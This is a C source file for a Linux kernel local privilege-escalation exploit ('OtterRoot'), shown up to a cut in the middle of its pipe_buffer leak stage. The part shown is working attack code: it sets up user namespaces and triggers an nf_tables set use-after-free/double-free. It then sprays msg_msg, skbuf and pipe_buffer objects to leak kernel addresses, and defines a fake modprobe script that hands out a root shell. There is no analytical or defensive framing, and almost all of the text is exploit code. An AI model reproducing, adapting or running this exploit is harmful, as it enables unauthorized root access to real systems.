/*
OtterRoot: Linux Kernel Universal Exploit
<xten@osec.io>
*/
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/rule.h>
#include <libnftnl/table.h>
#include <libnftnl/object.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <signal.h>
#include <sched.h>
#include <unistd.h>
#include <sys/socket.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <time.h>
#include <execinfo.h>
#include <errno.h>
#include <sys/stat.h>

#define PAGE_SIZE 4096
#define PAGE_SHIFT 12
#define PHYSICAL_ALIGN 0x200000

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x43

#define SPRAY 512
#define SKBUF_SPRAY 128
#define PIPE_SPRAY SKBUF_SPRAY

#define MODPROBE_SCRIPT "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"

#define MASK 0xfffffffff0000000

typedef struct
{
    long mtype;
    char mtext[0];
} msg_t;

struct list_head
{
    struct list_head *next, *prev;
};

struct msg_msg
{
    struct list_head m_list;
    long m_type;
    size_t m_ts; /* message text size */
    uint64_t next;
    uint64_t security;
    uint8_t text[0];
};

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

#define KEY_LEN 32
#ifndef NFT_SET_CONCAT
#define NFT_SET_CONCAT 128
#endif

#define mnl_batch_limit (1024 * 1024)
char mnl_batch_buffer[2 * mnl_batch_limit];

static uint64_t gettime_us()
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000ULL + ts.tv_nsec / 1000ULL;
}

#undef DBG
#define DBG(fmt, ...) fprintf(stderr, "[DBG %llu] " fmt "\n", (unsigned long long)gettime_us(), ##__VA_ARGS__)

#define LOG_ERR(ctx)                                                                   \
    do                                                                                 \
    {                                                                                  \
        int __e = errno;                                                               \
        fprintf(stderr, "[ERR %llu] %s failed: %s (errno=%d)\n",                     \
                (unsigned long long)gettime_us(), (ctx), strerror(__e), __e);          \
        void *__bt[16];                                                                \
        int __bt_size = backtrace(__bt, 16);                                           \
        backtrace_symbols_fd(__bt, __bt_size, 2);                                      \
    } while (0)

#define HEX_DUMP(buf, len)                                            \
    do                                                                \
    {                                                                 \
        const unsigned char *_bd = (const unsigned char *)(buf);      \
        size_t _bl = (len);                                           \
        fprintf(stderr, "[HEX_DUMP %s:%d] len=%zu\n", __func__, __LINE__, _bl); \
        for (size_t _i = 0; _i < _bl; _i++)                           \
        {                                                             \
            fprintf(stderr, "%02x ", _bd[_i]);                      \
            if ((_i + 1) % 16 == 0)                                   \
                fprintf(stderr, "\n");                               \
        }                                                             \
        if (_bl % 16)                                                 \
            fprintf(stderr, "\n");                                   \
    } while (0)

#define HEX_DUMP_RANGE(buf, off, len) HEX_DUMP(((uint8_t*)(buf)) + (off), (len))

static void crash_handler(int sig, siginfo_t *info, void *ucontext)
{
    fprintf(stderr, "\n[CRASH] Caught signal %d (%s) at address %p\n", sig, strsignal(sig), info->si_addr);
    LOG_ERR("crash_handler");
    _exit(1);
}

static void install_signal_handlers(void)
{
    struct sigaction sa = {0};
    sa.sa_sigaction = crash_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO | SA_RESETHAND;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);
    sigaction(SIGFPE, &sa, NULL);
}

static void dump_maps(void)
{
    DBG("===== /proc/self/maps =====");
    FILE *f = fopen("/proc/self/maps", "r");
    if (!f) { LOG_ERR("fopen(maps)"); return; }
    char line[256];
    while (fgets(line, sizeof(line), f))
        fprintf(stderr, "%s", line);
    fclose(f);
    DBG("===== end of maps =====");
}

static void dump_socket(int fd, const char *tag)
{
    int snd, rcv; socklen_t sl = sizeof(int);
    if (getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &snd, &sl) == -1) { LOG_ERR("getsockopt(SNDBUF)"); return; }
    if (getsockopt(fd, SOL_SOCKET, SO_RCVBUF, &rcv, &sl) == -1) { LOG_ERR("getsockopt(RCVBUF)"); return; }
    int flags = fcntl(fd, F_GETFL, 0);
    DBG("socket[%s] fd=%d SNDBUF=%d RCVBUF=%d flags=0x%x", tag, fd, snd, rcv, flags);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    DBG("unshare_setup(uid=%d, gid=%d)", uid, gid);
    fflush(stderr);
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void set_cpu_affinity(int cpu_n, pid_t pid)
{
    DBG("set_cpu_affinity(cpu_n=%d, pid=%d)", cpu_n, pid);
    fflush(stderr);
    cpu_set_t *set = malloc(sizeof(cpu_set_t));

    CPU_ZERO(set);
    CPU_SET(cpu_n, set);

    if (sched_setaffinity(pid, sizeof(set), set) < 0)
    {
        perror("sched_setaffinity");
        return;
    }
    free(set);
}

uint32_t family = NFPROTO_INET;
char *spray_table_name = "spray_table";
char *exploit_table_name = "exploit_table";

char *spray_chain_name = "OUTPUT";
char *exploit_chain_name = "OUTPUT";

struct nftnl_table
{
    struct list_head head;

    const char *name;
    uint32_t family;
    uint32_t table_flags;
    uint64_t handle;
    uint32_t use;
    uint32_t flags;
    uint32_t owner;
    struct
    {
        void *data;
        uint32_t len;
    } user;
};

struct nftnl_expr
{
    struct list_head head;
    uint32_t flags;
    struct expr_ops *ops;
    uint8_t data[];
};

struct nftnl_table *create_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char *table_name, void *udata, uint32_t ulen)
{
    DBG("create_table(name=%s, seq=%u, ulen=%u)", table_name, seq, ulen);
    fflush(stderr);
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL)
    {
        errx(1, "nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    if (udata != NULL)
    {
        nftnl_table_set_data(table, NFTNL_TABLE_USERDATA, udata, ulen);
    }

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    return table;
}

void delete_table(struct mnl_nlmsg_batch *batch, uint32_t seq, char *table_name)
{
    DBG("delete_table(name=%s, seq=%u)", table_name, seq);
    fflush(stderr);
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL)
    {
        errx(1, "nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELTABLE,
        family,
        NLM_F_ACK,
        seq);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nftnl_table_free(table);
}

struct nftnl_set *create_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
                             char *table_name, char *set_name, uint32_t set_id, uint32_t set_flags,
                             uint32_t set_key_len, uint32_t set_desc_len, uint8_t *desc,
                             void *set_userdata, uint32_t set_userdata_len, uint32_t obj_type)
{
    DBG("create_set(table=%s, set=%s, seq=%u, key_len=%u)", table_name, set_name, seq, set_key_len);
    fflush(stderr);
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL)
    {
        errx(1, "nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, set_key_len);
    if (set_userdata != NULL)
    {
        nftnl_set_set_data(set, NFTNL_SET_USERDATA, set_userdata, set_userdata_len);
    }
    if (desc != NULL)
    {
        nftnl_set_set_data(set, NFTNL_SET_DESC_CONCAT, desc, sizeof(uint8_t) * set_desc_len);
    }
    if (obj_type != 0)
    {
        nftnl_set_set_u32(set, NFTNL_SET_OBJ_TYPE, obj_type);
    }

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSET,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    return set;
}

static void create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
                         char *table_name, char *chain_name)
{
    DBG("create_chain(table=%s, chain=%s, seq=%u)", table_name, chain_name, seq);
    fflush(stderr);
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL)
    {
        errx(1, "nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        family,
        NLM_F_CREATE | NLM_F_ACK,
        seq);
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}

static void prepare_nftables(struct mnl_socket *nl)
{
    DBG("prepare_nftables() start");
    fflush(stderr);
    uint32_t portid, seq, table_seq;
    int ret;

    seq = rand() % (UINT32_MAX / 2);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    // table for spray
    create_table(batch, seq++, spray_table_name, NULL, 0);
    create_chain(batch, seq++, spray_table_name, spray_chain_name);

    // table for exploit
    create_table(batch, seq++, exploit_table_name, NULL, 0);
    create_chain(batch, seq++, exploit_table_name, exploit_chain_name);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq)
    {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret == -1)
        {
            perror("[-] mnl_socket_recvfrom()");
        }
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret == -1)
        {
            perror("[-] mnl_cb_run()");
        }
        table_seq++;
    }
}

static void trigger_uaf(struct mnl_socket *nl, size_t size, int *msgqids)
{
    DBG("trigger_uaf(size=%zu)", size);
    fflush(stderr);
    uint32_t seq;
    struct nlmsghdr *nlh;
    struct mnl_nlmsg_batch *batch;
    struct nftnl_set *set;
    char *udata_buf[size];
    char key[KEY_LEN];
    struct nft_set_elem *elem[3];
    memset(udata_buf, 0x41, size);

    int ret;
    int evil_qids[2];

    seq = rand() % (UINT32_MAX / 2);

    // TRANSACTION 1
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // dummy obj (not relevant)
    struct nftnl_obj *obj = nftnl_obj_alloc();
    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, "pwnobj");
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, exploit_table_name);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_CT_EXPECT);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_L4PROTO, IPPROTO_TCP);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_SIZE, 0x41);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_DPORT, 0x4141);
    nftnl_obj_set_u8(obj, NFTNL_OBJ_CT_EXPECT_TIMEOUT, 0x41414141);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWOBJ, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);

    // TRANSACTION 2
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // create pipapo set
    uint8_t desc[2] = {16, 16};
    set = create_set(
        batch, seq++, exploit_table_name, "pwn_set", 0x1337,
        NFT_SET_INTERVAL | NFT_SET_OBJECT | NFT_SET_CONCAT, KEY_LEN, 2, &desc, NULL, 0, NFT_OBJECT_CT_EXPECT);

    // commit elems to set
    for (int i = 0; i < 2; i++)
    {
        elem[i] = nftnl_set_elem_alloc();
        memset(key, 0x41 + i, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_OBJREF, "pwnobj", 7);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_KEY, &key, KEY_LEN);
        nftnl_set_elem_set(elem[i], NFTNL_SET_ELEM_USERDATA, &udata_buf, size);
        nftnl_set_elem_add(set, elem[i]);
    }

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                NFT_MSG_NEWSETELEM, family,
                                NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
                                seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] [-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

bool trigger_modprobe(int status_fd)
{
    DBG("trigger_modprobe(status_fd=%d)", status_fd);
    fflush(stderr);
    char *argv = NULL;
    int fd = memfd_create("", MFD_CLOEXEC);
    int status = 0;

    write(fd, "\xff\xff\xff\xff", 4);
    fexecve(fd, &argv, &argv);
    close(fd);

    read(status_fd, &status, 1);
    if (status)
    {
        return true;
    }
    return false;
}

void udata_spray(struct mnl_socket *nl, uint32_t size, uint32_t start, uint32_t count, void *data)
{
    DBG("udata_spray(size=%u, start=%u, count=%u, data=%p)", size, start, count, data);
    fflush(stderr);
    char spray_name[16];
    char udata_buf[size];
    char *dptr = &udata_buf;
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (data)
    {
        dptr = data;
    }

    for (int i = start; i < start + count; i++)
    {
        if (!data)
        {
            memset(udata_buf, 0x30 + i, size);
        }
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        nftnl_table_free(create_table(batch, seq++, spray_name, dptr, size));
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

void deludata_spray(struct mnl_socket *nl, uint32_t start, uint32_t count)
{
    DBG("deludata_spray(start=%u, count=%u)", start, count);
    fflush(stderr);
    char spray_name[16];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    for (int i = start; i < start + count; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%i", i);
        delete_table(batch, seq++, spray_name);
    }

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }
    mnl_nlmsg_batch_stop(batch);
}

static int table_cb(const struct nlmsghdr *nlh, void *data)
{
    DBG("table_cb() invoked");
    char buf[4096];
    struct nftnl_table **out = (struct nftnl_table **)data;

    struct nftnl_table *table = nftnl_table_alloc();

    if (nftnl_table_nlmsg_parse(nlh, table) < 0)
    {
        perror("nftnl_table_nlmsg_parse");
        goto err_free;
    }

    nftnl_table_snprintf(buf, sizeof(buf), table, NFTNL_OUTPUT_DEFAULT, 0);
    *out = table;
    goto out;

err_free:
    nftnl_table_free(table);
out:
    return MNL_CB_OK;
}

char *getudata(struct mnl_socket *nl, char *table_name)
{
    DBG("getudata(table_name=%s)", table_name);
    fflush(stderr);
    char buf[MNL_SOCKET_BUFFER_SIZE];
    uint32_t seq = rand() % (UINT32_MAX / 2);
    struct nftnl_table *table = nftnl_table_alloc();
    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(buf, NFT_MSG_GETTABLE, family,
                                                       NLM_F_ACK, seq);
    uint32_t portid = mnl_socket_get_portid(nl);
    uint32_t type = NFTNL_OUTPUT_DEFAULT;
    int ret;

    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_nlmsg_build_payload(nlh, table);
    nftnl_table_free(table);

    if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
    {
        perror("[-] mnl_socket_sendto");
    }

    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    while (ret > 0)
    {
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        if (ret > 200 && ret < 300)
        {
            mnl_cb_run(buf, ret, seq, portid, table_cb, &table);
            break;
        }
    }
    if (ret < 0)
    {
        perror("[-] mnl_socket_recvfrom");
    }

    char *out = calloc(1, table->user.len);
    memcpy(out, table->user.data, table->user.len);
    return out;
}

bool isheap(uint64_t ptr)
{
    DBG("isheap(ptr=0x%lx)", ptr);
    int high = ptr >> 44;
    if (high >= 0xffff8 && high < 0xfffff)
    {
        return true;
    }
    return false;
}

bool ismsg(uint64_t *obj, uint64_t mtype)
{
    DBG("ismsg(obj=%p, mtype=0x%lx)", obj, mtype);
    if (isheap(obj[0]) &&
        isheap(obj[1]) &&
        obj[2] == mtype)
    {
        return true;
    }
    return false;
}

void wait_destroyer(void)
{
    DBG("wait_destroyer() sleeping");
    usleep(20 * 1000); // let destroyer work finish
}

bool check_modprobe(char *expected)
{
    DBG("check_modprobe(expected=%s)", expected);
    fflush(stderr);
    char buf[32];
    int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
    if (fd < 0)
    {
        perror("[-] open(modprobe)");
    }
    read(fd, buf, 32);
    if (!strcmp(buf, expected))
    {
        close(fd);
        return true;
    }
    close(fd);
    return false;
}

static bool is_kernel_base(unsigned char *addr)
{
    // Keep debug minimal here to avoid flooding
    DBG("is_kernel_base(addr=%p) invoked", addr);
    // thanks lau :)

    // get-sig kernel_runtime_1
    if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
        memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
        return true;

    // get-sig kernel_runtime_2
    if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
        memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
        memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
        memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
        memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
        memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
        memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
        memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
        memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
        memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
        memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
        return true;

    return false;
}

int exploit(int argc, char **argv)
{
    DBG("exploit(argc=%d) start", argc);
    fflush(stderr);

    dump_maps();
    // Setup I/O for shell
    int stdin_fd = dup(STDIN_FILENO);
    int stdout_fd = dup(STDOUT_FILENO);

    // Setup fake modprobe
    int modprobe_fd = memfd_create("", MFD_CLOEXEC);
    int status_fd = memfd_create("", 0);

    // Setup netlink
    struct mnl_socket *nl;
    nl = mnl_socket_open(NETLINK_NETFILTER);
    DBG("netlink socket opened: %p", nl);
    if (nl == NULL)
    {
        perror("[-] mnl_socket_open()");
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
    {
        perror("[-] mnl_socket_bind()");
    }
    DBG("netlink bound with portid=%u", mnl_socket_get_portid(nl));

    // Setup skbuf
    int sock[SKBUF_SPRAY][2];
    DBG("creating %d socketpairs for skbuf spray", SKBUF_SPRAY);
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock[i]) < 0)
        {
            LOG_ERR("socketpair");
            return -1;
        }
        dump_socket(sock[i][0], "spray_w");
        dump_socket(sock[i][1], "spray_r");
    }

    // Setup table and chains
    puts("[*] prepare table and chain");
    prepare_nftables(nl);
    DBG("nftables prepared");

    // Spray msg_msg in kmalloc-256 and kmalloc-1k
    msg_t *msg = calloc(1, sizeof(msg_t) + 0xe8 - 48);
    if (!msg) { LOG_ERR("calloc(msg)"); return -1; }
    DBG("calloc msg (size=%zu) => %p", sizeof(msg_t) + 0xe8 - 48, msg);
    int qid[SPRAY];
    for (int i = 0; i < SPRAY; i++)
    {
        qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
        if (qid[i] < 0)
        {
            perror("[-] msgget");
        }
        *(uint32_t *)msg->mtext = i;
        *(uint64_t *)&msg->mtext[8] = 0xdeadbeefcafebabe;
        msg->mtype = MTYPE_PRIMARY;
        msgsnd(qid[i], msg, 0xe8 - 48, 0);
        msg->mtype = MTYPE_SECONDARY;
        msgsnd(qid[i], msg, 1024 - 48, 0);
        if (!(i % 16))
        {
            DBG("sprayed %d/%d msg queues", i, SPRAY);
        }
    }
    DBG("msg_msg spray completed");

    // Prepare evil msg
    int evilqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (evilqid < 0)
    {
        perror("[-] msgget");
    }
    DBG("evil message queue id=%d", evilqid);
    
    puts("[*] trigger double-free");
    trigger_uaf(nl, 0x88 + 3, NULL);
    wait_destroyer();
    DBG("double-free triggered, proceeding to user data spray");

    /*
     * Spray 64 tables (spray-0 .. spray-63) right after the double-free to
     * maximise the chance that one of them reuses the vulnerable chunk.
     */
    const int spray_cnt = 64;
    udata_spray(nl, 0xe8, 0, spray_cnt, NULL);

    /*
     * Read back the userdata of every sprayed table and look for duplicated
     * first bytes – an indicator that two table structures overlap the same
     * freed chunk.  Do not abort the exploit if no duplication is detected;
     * continue regardless so we can observe the behaviour.
     */
    char spray_name[32];
    char **udata = calloc(spray_cnt, sizeof(char *));
    bool dup_found = false;

    for (int i = 0; i < spray_cnt; i++)
    {
        snprintf(spray_name, sizeof(spray_name), "spray-%d", i);
        udata[i] = getudata(nl, spray_name);
        printf("→ %s: udata[%d] = 0x%02x\n", spray_name, i, (unsigned char)udata[i][0]);

        /* simple O(n^2) duplicate search – sufficient for 64 entries */
        for (int j = 0; j < i; j++)
        {
            if (udata[i][0] == udata[j][0])
            {
                printf("[+] duplicated table detected: %s and spray-%d (0x%02x)\n",
                       spray_name, j, (unsigned char)udata[i][0]);
                dup_found = true;
            }
        }
    }

    if (!dup_found)
    {
        puts("[!] No duplicated table detected – attempting additional calloc() heap spray");

        /*
         * Fallback heap-spray: allocate 512 contiguous 0xe8-sized chunks via
         * calloc() and fill them with 'A' (0x41).  Holding references in a
         * static array prevents them from being freed by the compiler/runtime.
         */
        static void *calloc_spray[512] = {0};
        for (int i = 0; i < 512; i++)
        {
            calloc_spray[i] = calloc(1, 232);
            if (!calloc_spray[i])
            {
                perror("[-] calloc_spray");
                break;
            }
            memset(calloc_spray[i], 0x41, 232);
        }
        puts("[*] calloc heap spray completed");
    }

    // Replace nft_obj with msg_msg
    puts("[*] replace with msg_msg");
    DBG("replacing nft_obj with crafted msg_msg");
    memset(msg->mtext, 0x41, 8);
    msg->mtype = MTYPE_PRIMARY;

    deludata_spray(nl, 0, 1);
    wait_destroyer();
    msgsnd(evilqid, msg, 0xe8 - 48, 0);
    msg->mtype = MTYPE_SECONDARY;
    msgsnd(evilqid, msg, 1024 - 48, 0);
    uint64_t *fake_obj = (uint64_t *)getudata(nl, "spray-2");
    DBG("fake_obj=%p | qwords: [0]=0x%lx [1]=0x%lx [2]=0x%lx", fake_obj, fake_obj[0], fake_obj[1], fake_obj[2]);
    HEX_DUMP(fake_obj, 64);

    uint64_t msg_ptr = fake_obj[0];
    printf("[*] kmalloc-1k msg: 0x%lx\n", msg_ptr);
    DBG("msg_ptr=0x%lx", msg_ptr);

    // Find next msg
    fake_obj[0] -= 1024 * 20;
    deludata_spray(nl, 2, 1);
    wait_destroyer();
    udata_spray(nl, 0xe8, 3, 1, fake_obj);
    wait_destroyer();
    if (msgrcv(evilqid, msg, 1024 - 48, MTYPE_SECONDARY, IPC_NOWAIT | MSG_COPY) < 0)
    {
        perror("[-] msgrcv");
    }

    int victim_idx = *(uint32_t *)msg->mtext;
    printf("[*] victim qid: %i\n", qid[victim_idx]);
    DBG("victim_idx=%d, qid=%d", victim_idx, qid[victim_idx]);

    // Free kmalloc-1k msg
    if (msgrcv(qid[victim_idx], msg, 1024 - 48, MTYPE_SECONDARY, 0) < 0)
    {
        perror("[-] msgrcv");
    }

    // Replace msg with a fake msg using skbuf
    struct msg_msg *fake_msg = calloc(1, sizeof(struct msg_msg) + 1024 - 48);
    if (!fake_msg) { LOG_ERR("calloc(fake_msg)"); return -1; }
    DBG("calloc fake_msg (size=%zu) => %p", sizeof(struct msg_msg) + 1024 - 48, fake_msg);
    fake_msg->m_list.next = msg_ptr - 1024 * 20;
    fake_msg->m_list.prev = msg_ptr - 1024 * 20;
    fake_msg->m_type = MTYPE_FAKE;
    fake_msg->m_ts = 1024 - 48;
    *(uint64_t *)fake_msg->text = 0x1337133713371337;
    puts("[*] send fake msg skbuf");
    for (int i = 0; i < SKBUF_SPRAY; i++)
    {
        if (write(sock[i][0], fake_msg, 1024 - 320) < 0)
        {
            LOG_ERR("write(socket)");
            return -1;
        }
    }

    // Double free kmalloc-1k msg
    puts("[*] double-free victim msg");
    if (msgrcv(evilqid, msg, 1024 - 48, MTYPE_FAKE, 0) < 0)
    {
        perror("[-] msgrcv");
    }

    // Spray pipe_buffer victims
    int fdflags;
    int pfd[PIPE_SPRAY][2];
    for (int i = 0; i < PIPE_SPRAY; i++)
    {
        pipe(pfd[i]);
        fdflags = fcntl(pfd[i][0], F_GETFL, 0);
        fcntl(pfd[i][0], F_SETFL, fdflags | O_NONBLOCK);
        fdflags = fcntl(pfd[i][1], F_GETFL, 0);
        fcntl(pfd[i][1], F_SETFL, fdflags | O_NONBLOCK);
    }

    // Populate pipe_buffer
    for (int i = 0; i < PIPE_SPRAY; i++)
    {
        write(pfd[i][1], "pwn", 3);
    }

    // Leak pipe_buffer
    char leak[1024];
    struct pipe_buffer *pipebuf = calloc(1, 1024);
